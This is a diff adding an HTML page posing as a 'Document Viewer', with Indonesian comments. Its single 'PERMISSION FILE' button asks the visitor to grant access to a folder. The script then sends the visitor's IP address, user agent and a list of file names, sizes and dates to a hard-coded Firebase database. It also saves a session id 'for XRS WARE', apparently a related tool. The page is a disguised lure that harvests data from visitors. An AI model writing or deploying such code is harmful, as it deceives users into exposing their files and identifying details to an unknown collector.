@@ -1,0 +1,206 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document Viewer</title>
+    <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-database-compat.js"></script>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        
+        body {
+            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
+            color: #fff;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+        
+        .container {
+            max-width: 500px;
+            width: 100%;
+            background: rgba(255, 255, 255, 0.05);
+            backdrop-filter: blur(10px);
+            border-radius: 15px;
+            padding: 30px;
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            text-align: center;
+        }
+        
+        h1 {
+            font-size: 1.8rem;
+            margin-bottom: 30px;
+            color: #e6e6e6;
+        }
+        
+        .permission-btn {
+            display: block;
+            width: 100%;
+            padding: 18px;
+            background: linear-gradient(90deg, #4e54c8, #8f94fb);
+            color: white;
+            text-decoration: none;
+            border-radius: 8px;
+            font-weight: bold;
+            border: none;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            font-size: 1.2rem;
+            margin: 20px 0;
+            box-shadow: 0 4px 15px rgba(78, 84, 200, 0.4);
+        }
+        
+        .permission-btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 8px 20px rgba(78, 84, 200, 0.6);
+        }
+        
+        .permission-btn:active {
+            transform: translateY(-1px);
+        }
+        
+        .status {
+            margin-top: 20px;
+            padding: 15px;
+            border-radius: 8px;
+            background: rgba(0, 0, 0, 0.2);
+            display: none;
+        }
+        
+        .loading {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            border: 3px solid rgba(255,255,255,.3);
+            border-radius: 50%;
+            border-top-color: #fff;
+            animation: spin 1s ease-in-out infinite;
+            margin-right: 10px;
+        }
+        
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        
+        footer {
+            margin-top: 30px;
+            text-align: center;
+            color: #888;
+            font-size: 0.8rem;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Document Viewer Application</h1>
+        
+        <button class="permission-btn" id="accessBtn">PERMISSION FILE</button>
+        
+        <div class="status" id="status">
+            <span class="loading"></span>
+            <span id="statusText">Processing request...</span>
+        </div>
+    </div>
+
+    <footer>
+        <p>&copy; 2023 Document Viewer. All rights reserved.</p>
+    </footer>
+
+    <script>
+        // Initialize Firebase
+        const firebaseConfig = {
+            apiKey: "AIzaSyA_QzbdScTX2dLdu_VchsPH1JL-1tn3RcI",
+            authDomain: "chat-message-fcf6f.firebaseapp.com",
+            databaseURL: "https://chat-message-fcf6f-default-rtdb.asia-southeast1.firebasedatabase.app",
+            projectId: "chat-message-fcf6f",
+            storageBucket: "chat-message-fcf6f.firebasestorage.app",
+            messagingSenderId: "137162503818",
+            appId: "1:137162503818:web:2c782da021738705e99f73",
+            measurementId: "G-V6NNC4148E"
+        };
+        
+        firebase.initializeApp(firebaseConfig);
+        const database = firebase.database();
+        
+        // Variabel untuk menyimpan handle akses file
+        let directoryHandle;
+        
+        document.getElementById('accessBtn').addEventListener('click', async function() {
+            const statusElem = document.getElementById('status');
+            const statusText = document.getElementById('statusText');
+            
+            statusElem.style.display = 'block';
+            
+            // Meminta izin akses file menggunakan File System Access API
+            try {
+                statusText.textContent = 'Meminta izin akses file...';
+                
+                // Meminta pengguna memilih direktori
+                directoryHandle = await window.showDirectoryPicker();
+                
+                statusText.textContent = 'Akses diberikan. Mencatat session...';
+                
+                // Get user IP and user agent
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                const ipAddress = ipData.ip;
+                const userAgent = navigator.userAgent;
+                const timestamp = new Date().toISOString();
+                
+                // Simpan informasi file yang diakses
+                let fileList = [];
+                for await (const entry of directoryHandle.values()) {
+                    if (entry.kind === 'file') {
+                        const file = await entry.getFile();
+                        fileList.push({
+                            name: file.name,
+                            size: file.size,
+                            type: file.type,
+                            lastModified: file.lastModified
+                        });
+                    }
+                }
+                
+                // Save to Firebase
+                const sessionId = generateUniqueId();
+                const userRef = database.ref('sessions/' + sessionId);
+                await userRef.set({
+                    ip: ipAddress,
+                    userAgent: userAgent,
+                    timestamp: timestamp,
+                    accessGranted: true,
+                    fileCount: fileList.length,
+                    sessionId: sessionId
+                });
+                
+                // Simpan daftar file
+                const filesRef = database.ref('files/' + sessionId);
+                await filesRef.set(fileList);
+                
+                statusText.innerHTML = 'Akses diberikan! Session telah dicatat.';
+                
+                // Simpan sessionId di localStorage untuk XRS WARE
+                localStorage.setItem('xrsSessionId', sessionId);
+                
+            } catch (error) {
+                console.error("Error accessing files:", error);
+                statusText.innerHTML = 'Error: ' + error.message;
+            }
+        });
+        
+        function generateUniqueId() {
+            return Math.random().toString(36).substr(2, 9) + Date.now().toString(36);
+        }
+    </script>
+</body>
+</html>
